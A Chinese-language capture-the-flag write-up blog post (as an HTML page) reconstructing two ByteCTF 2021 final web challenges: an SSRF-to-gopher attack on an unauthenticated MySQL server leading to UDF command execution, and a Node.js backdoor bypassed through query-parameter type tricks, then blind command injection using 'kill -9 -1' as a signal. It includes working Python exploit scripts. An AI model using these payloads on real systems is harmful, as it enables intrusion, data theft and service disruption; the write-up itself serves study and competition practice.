@@ -1,0 +1,767 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"blog.z3ratu1.cn","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="bytectf2021final复现菜狗并没有打进ByteCTF2021 final，但是在比赛结束之后环境并没有立即关闭，感谢rmb神仙带我，让我进行复现呜呜 seo一个前端写的还挺好看的站，有一些乱七八糟的功能，写了好几个api，实际上有用的只有一个词库里面的任意文件下载，然后下&#x2F;api&#x2F;ip.php，有一个curl的ssrf这个ssrf还把请求的结果base64一下再返回">
+<meta property="og:type" content="article">
+<meta property="og:title" content="bytectf2021final复现">
+<meta property="og:url" content="https://blog.z3ratu1.cn/bytectf2021final%E5%A4%8D%E7%8E%B0.html">
+<meta property="og:site_name" content="Z3ratu1&#39;s blog">
+<meta property="og:description" content="bytectf2021final复现菜狗并没有打进ByteCTF2021 final，但是在比赛结束之后环境并没有立即关闭，感谢rmb神仙带我，让我进行复现呜呜 seo一个前端写的还挺好看的站，有一些乱七八糟的功能，写了好几个api，实际上有用的只有一个词库里面的任意文件下载，然后下&#x2F;api&#x2F;ip.php，有一个curl的ssrf这个ssrf还把请求的结果base64一下再返回">
+<meta property="og:locale">
+<meta property="article:published_time" content="2021-12-13T13:50:41.000Z">
+<meta property="article:modified_time" content="2021-12-16T14:16:15.198Z">
+<meta property="article:author" content="Z3ratu1">
+<meta property="article:tag" content="wp">
+<meta property="article:tag" content="SSTI">
+<meta property="article:tag" content="SQLI">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://blog.z3ratu1.cn/bytectf2021final%E5%A4%8D%E7%8E%B0.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-Hans'
+  };
+</script>
+
+  <title>bytectf2021final复现 | Z3ratu1's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Z3ratu1's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">Welcome</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" placeholder="搜索..." spellcheck="false" type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+  <a href="https://github.com/Z3ratu1" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="external nofollow noopener noreferrer" target="_blank"><svg width="80" height="80" viewbox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="https://blog.z3ratu1.cn/bytectf2021final%E5%A4%8D%E7%8E%B0.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://q2.qlogo.cn/headimg_dl?dst_uin=1207039417&spec=160">
+      <meta itemprop="name" content="Z3ratu1">
+      <meta itemprop="description" content="与其感慨路难行，不如现在出发">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Z3ratu1's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          bytectf2021final复现
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-12-13 21:50:41" itemprop="dateCreated datePublished" datetime="2021-12-13T21:50:41+08:00">2021-12-13</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-12-16 22:16:15" itemprop="dateModified" datetime="2021-12-16T22:16:15+08:00">2021-12-16</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" itemprop="url" rel="index"><span itemprop="name">刷题记录</span></a>
+                </span>
+            </span>
+
+          
+            <span id="/bytectf2021final%E5%A4%8D%E7%8E%B0.html" class="post-meta-item leancloud_visitors" data-flag-title="bytectf2021final复现" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/bytectf2021final%E5%A4%8D%E7%8E%B0.html#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/bytectf2021final%E5%A4%8D%E7%8E%B0.html" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="bytectf2021final复现"><a href="#bytectf2021final复现" class="headerlink" title="bytectf2021final复现"></a>bytectf2021final复现</h1><p>菜狗并没有打进ByteCTF2021 final，但是在比赛结束之后环境并没有立即关闭，感谢rmb神仙带我，让我进行复现呜呜</p>
+<h2 id="seo"><a href="#seo" class="headerlink" title="seo"></a>seo</h2><p>一个前端写的还挺好看的站，有一些乱七八糟的功能，写了好几个api，实际上有用的只有一个词库里面的任意文件下载，然后下&#x2F;api&#x2F;ip.php，有一个curl的ssrf<br>这个ssrf还把请求的结果base64一下再返回，真的是很贴心的配合gopher的操作，就是接下来的操作并不是非常的人性化，扫网段找服务？先读&#x2F;etc&#x2F;hosts确定机器的网段是<code>172.73.23.0/24</code>，然后我也不知道扫什么服务就硬扫全网段？有点离谱<br>rmb神仙说先扫gopherus里面常见的能打的服务，扫全端口肯定不现实，所以是扫整个网段内的特定端口，比如redis，mysql之类的，因此可以在172.73.23.100:3306上扫到一个mysql。（我还是觉得离谱）</p>
+<p>看了下wm的wp，读了<code>/proc/net/arp</code>，能够迅速的发现172.73.23.100的存在</p>
+<p>gopher打mysql是需要账户没有密码的，有密码要交互，打不通。所以直接root无密码一把梭，先select一个12345试试，成了，能打SQL<br>然后数据库中无内容，需要打mysql执行命令。可以先执行一下<code>show variable like &#39;secure_file_priv&#39;</code>看一下有没有写文件权限，为空就任意写，然后再看<code>show variable like &#39;plugin_dir&#39;</code>看插件目录是在哪<br>mysql5.1后规定加载插件只能从插件目录下加载，插件目录存在+允许mysql写文件，接下来就是经典的UDF提权操作了（虽然这里是命令执行），windows下可能因为mysql运行权限比较高，一般来说是提权</p>
+<p>UDF -&gt; user defined function，允许用户自定义mysql函数，写一个.so&#x2F;dll放到插件目录下加载，即可像使用内置函数一样使用自定义函数，扩展性极强</p>
+<p>需要.so&#x2F;dll符合平台类型以及mysql的位数，自己写一个还需要下一堆mysql相关的文件，所以我们直接用msf里面自带的<br>udf的写入也是一个问题，可以直接把整个二进制文件转换成base64或者hex编码，然后整个塞进查询语句里面，直接into dumpfile。然后<code>CREATE FUNCTION sys_eval RETURNS STRING SONAME &#39;udf.so&#39;</code>加载写入的so<br>如果环境是公有的，还可以直接用<code>select * from mysql.func</code>看一下已经定义了的udf，看能不能急速上车，防止别人上车也很容易，用完用<code>drop function sys_eval</code>把函数删了就行</p>
+<p>这里我不知道为什么出问题，我先把整个文件hex编码放进gopherus里面，再把输出的payload粘贴到脚本里面跑，总是跑不起来，我一开始怀疑是长度过大了，准备使用创建一个临时表，分段往表里面写数据的形式写入，再一口气导出的操作，所以把gopherus里面mysql的部分扒了出来缝合上去，不然没法自动化。结果缝合了之后又一把跑通了，玄幻<br>缺点就是gopherus python2写的，和python3的差距似乎在于对string和byte之间的转换上，懒得查怎么回事，就直接改Python2跑了</p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests
+<span class="token keyword">import</span> base64
+<span class="token keyword">import</span> json
+
+user <span class="token operator">=</span> <span class="token string">"root"</span>
+encode_user <span class="token operator">=</span> user<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"hex"</span><span class="token punctuation">)</span>
+user_length <span class="token operator">=</span> len<span class="token punctuation">(</span>user<span class="token punctuation">)</span>
+temp <span class="token operator">=</span> user_length <span class="token operator">-</span> <span class="token number">4</span>
+length <span class="token operator">=</span> <span class="token punctuation">(</span>chr<span class="token punctuation">(</span><span class="token number">0xa3</span><span class="token operator">+</span>temp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"hex"</span><span class="token punctuation">)</span>
+
+dump <span class="token operator">=</span> length <span class="token operator">+</span> <span class="token string">"00000185a6ff0100000001210000000000000000000000000000000000000000000000"</span>
+dump <span class="token operator">+=</span> encode_user
+dump <span class="token operator">+=</span> <span class="token string">"00006d7973716c5f6e61746976655f70617373776f72640066035f6f73054c696e75780c5f636c69656e745f6e616d65086c"</span>
+dump <span class="token operator">+=</span> <span class="token string">"69626d7973716c045f7069640532373235350f5f636c69656e745f76657273696f6e06352e372e3232095f706c6174666f726d"</span>
+dump <span class="token operator">+=</span> <span class="token string">"067838365f36340c70726f6772616d5f6e616d65056d7973716c"</span>
+
+auth <span class="token operator">=</span> dump<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">encode</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    a <span class="token operator">=</span> <span class="token punctuation">[</span>s<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> len<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
+    <span class="token keyword">return</span> <span class="token string">"gopher://172.73.23.100:3306/_%"</span> <span class="token operator">+</span> <span class="token string">"%"</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>a<span class="token punctuation">)</span>
+
+
+<span class="token keyword">def</span> <span class="token function">get_payload</span><span class="token punctuation">(</span>query<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span>query<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        query <span class="token operator">=</span> query<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"hex"</span><span class="token punctuation">)</span>
+        query_length <span class="token operator">=</span> <span class="token string">'{:06x}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span><span class="token punctuation">(</span>int<span class="token punctuation">(</span><span class="token punctuation">(</span>len<span class="token punctuation">(</span>query<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+        query_length <span class="token operator">=</span> query_length<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span>
+        pay1 <span class="token operator">=</span> query_length <span class="token operator">+</span> <span class="token string">"0003"</span> <span class="token operator">+</span> query
+        final <span class="token operator">=</span> encode<span class="token punctuation">(</span>auth <span class="token operator">+</span> pay1 <span class="token operator">+</span> <span class="token string">"0100000001"</span><span class="token punctuation">)</span>
+        <span class="token keyword">return</span> final
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> encode<span class="token punctuation">(</span>auth<span class="token punctuation">)</span>
+
+
+url <span class="token operator">=</span> <span class="token string">"http://47.94.152.65:30001/api/ip.php"</span>
+<span class="token comment" spellcheck="true"># for i in range(1, 255):</span>
+query <span class="token operator">=</span> <span class="token string">"drop function sys_eval;"</span>
+data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"domain"</span><span class="token punctuation">:</span> get_payload<span class="token punctuation">(</span>query<span class="token punctuation">)</span><span class="token punctuation">}</span>
+res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true"># print(res.text)</span>
+j <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true"># print(res.text)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>j<span class="token punctuation">[</span><span class="token string">'res'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+</code></pre>
+<h3 id="windows下的UDF"><a href="#windows下的UDF" class="headerlink" title="windows下的UDF"></a>windows下的UDF</h3><p>windows下的UDF提权操作可以稍微简单一点，如果目标机器通外网或者内网其他机器有写权限的时候，可以通过<code>\\ip@port\path</code> UNC path，可以用来进行远程访问，直接加载对应文件</p>
+<p>在终端上执行的时候需要转义反斜杠，也就是四个斜杠来表示一个UNC路径。简单测试了一下，只有windows下的mysql支持UNC路径进行远程加载（毕竟这个是windows才有的东西），但是我还是非常的愚蠢，我一开始居然会觉得这个UNC路径的加载是使用http协议的。。。后来搜了一下，说是使用的smb和webdav，先默认连接445的smb端口，连不上再去用http连webdav，如果指定了SSL属性就用https，虽然说webdav是http的修改版，但正常的http服务器仍然无法提供webdav服务，所以想提供UNC路径的加载，还需要额外搭服务</p>
+<p>这个端口是用@来分隔的，我一开始还在用冒号（但是mysql似乎不支持这个@指定端口，本地测试并未成功，指定端口后wireshark都没看见有流量发出去，以及我怀疑学校有奇怪的策略，我什么都不加就连445端口但会被超级丢包），以及本地测试mysql好像并不会尝试去连webdav？wireshark抓包的结果是只给445还有139端口发送了数据</p>
+<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.sqlsec.com/2020/11/mysql.html">MySQL 漏洞利用与提权</a><br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://osandamalith.com/2018/02/11/mysql-udf-exploitation/">MySQL UDF Exploitation</a><br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.n00py.io/2019/06/understanding-unc-paths-smb-and-webdav/">Understanding UNC paths, SMB, and WebDAV</a></p>
+<h2 id="nothing"><a href="#nothing" class="headerlink" title="nothing"></a>nothing</h2><p>nodejs的一些操作，学到了一点东西<br>首先给出源码，这个题理论上来说是需要扫目录扫出源码的。。否则就是这个源码里写的一个<code>Here is a backdoor,can you shell it and get the flag?</code>。。。有点让人无语</p>
+<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">const</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span>
+<span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span>
+<span class="token keyword">const</span> exec <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>exec<span class="token punctuation">;</span>
+<span class="token keyword">const</span> src <span class="token operator">=</span> fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token string">"app.js"</span><span class="token punctuation">)</span>
+<span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+app<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token string">'ByteCTF'</span> <span class="token keyword">in</span> req<span class="token punctuation">.</span>query<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">"Here is a backdoor,can you shell it and get the flag?"</span><span class="token punctuation">)</span>
+        <span class="token keyword">return</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>ByteCTF<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">3000</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">const</span> byteCTF <span class="token operator">=</span> JSON<span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>ByteCTF<span class="token punctuation">)</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>byteCTF<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">1024</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">"too long."</span><span class="token punctuation">)</span>
+            <span class="token keyword">return</span>
+        <span class="token punctuation">}</span>
+
+        <span class="token keyword">try</span> <span class="token punctuation">{</span>
+            <span class="token keyword">const</span> q <span class="token operator">=</span> <span class="token string">"{"</span> <span class="token operator">+</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>ByteCTF <span class="token operator">+</span> <span class="token string">"}"</span>
+            res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">"Got it!"</span><span class="token punctuation">)</span>
+        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">{</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>backdoor<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                <span class="token function">exec</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>backdoor<span class="token punctuation">)</span>
+                res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"exec complete,but nothing here"</span><span class="token punctuation">)</span>
+            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+                res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">"Nothing here!"</span><span class="token punctuation">)</span>
+            <span class="token punctuation">}</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+        res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">"too short."</span><span class="token punctuation">)</span>
+        <span class="token keyword">return</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span><span class="token punctuation">)</span>
+
+app<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/source'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
+    res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>src<span class="token punctuation">)</span>
+<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">3000</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
+  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`listening at port 3000`</span></span><span class="token punctuation">)</span>
+<span class="token punctuation">}</span><span class="token punctuation">)</span> 
+</code></pre>
+<p>第一层很简单，要求<code>req.query.ByteCTF.length &gt; 3000</code>，同时在被解析成json之后长度小于1024，只要令ByteCTF这个名字有一个属性名字是length，然后值大于3000就行了嘛（所以我印象里好像有的地方有提到，开发时要使用其他方法来判断字符串的长度？）<br>第二层就略微的有些玄幻了，他需要<code>const q = &quot;&#123;&quot; + req.query.ByteCTF + &quot;&#125;&quot;</code>这一句话抛出一个异常，才能进try catch的命令执行，理论上来说，无论这个ByteCTF是什么类型，和字符串进行加都是不会出现异常的，并且我们这顶多也就是让ByteCTF是一个字典（还是对象？）</p>
+<p>这一步就比较的tricky，反正ByteCTF不会是一个字符串，那非字符串和字符串拼接需要隐式调用toString，因此可以把ByteCTF的toString属性也赋一个值，变成一个字符串，这样子和字符串做加法的时候toString不是函数，调用起来原地爆炸，就能进catch了</p>
+<p>第三步也很tricky，因为exec是另开进程进行执行的，且是异步非阻塞的，而回显也不存在，简单试了下感觉机器也不出网，反弹shell也不行。想办法盲注，但是盲注随你输什么，反正没有任何的反应，得到的结果永远是他写死的内容</p>
+<p>然后开始想歪门邪道，一开始想的是fork炸弹，丢了几个进去毫无反应，连卡顿都没有出现，然后想起了rmb神仙以前教我的杀全部进程之术<code>kill -9 -1</code>，以前是用来杀究极内存马的，因为本身执行命令的用户权限低于主服务的权限，所以杀全部进程也只是把服务进程杀掉，守护进程会重新拉起新的服务进程。一打就通，直接connect reset，拿到回显点了</p>
+<p>然后简单的研究了一下bash的if语句结果，先手打测出来了部分flag名字，写了个破烂脚本盲注</p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests
+
+charset <span class="token operator">=</span> <span class="token string">"1234567890abcdef"</span>
+url <span class="token operator">=</span> <span class="token string">"http://39.106.34.228:30001/?ByteCTF[length]=3001&amp;ByteCTF[toString]=aaa&amp;backdoor="</span>
+flag <span class="token operator">=</span> <span class="token string">"ByteCTF{"</span>
+cmd <span class="token operator">=</span> <span class="token string">"if cat /*f1a*|grep {};then kill -9 -1;fi"</span>
+<span class="token keyword">for</span> c <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">for</span> i <span class="token keyword">in</span> charset<span class="token punctuation">:</span>
+        send <span class="token operator">=</span> url <span class="token operator">+</span> cmd<span class="token punctuation">.</span>format<span class="token punctuation">(</span>flag<span class="token operator">+</span>i<span class="token punctuation">)</span>
+        <span class="token comment" spellcheck="true"># print(send)</span>
+        <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            <span class="token keyword">try</span><span class="token punctuation">:</span>
+                res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>send<span class="token punctuation">)</span>
+            <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
+                <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>
+                flag <span class="token operator">+=</span> i
+                <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
+                <span class="token keyword">break</span>
+</code></pre>
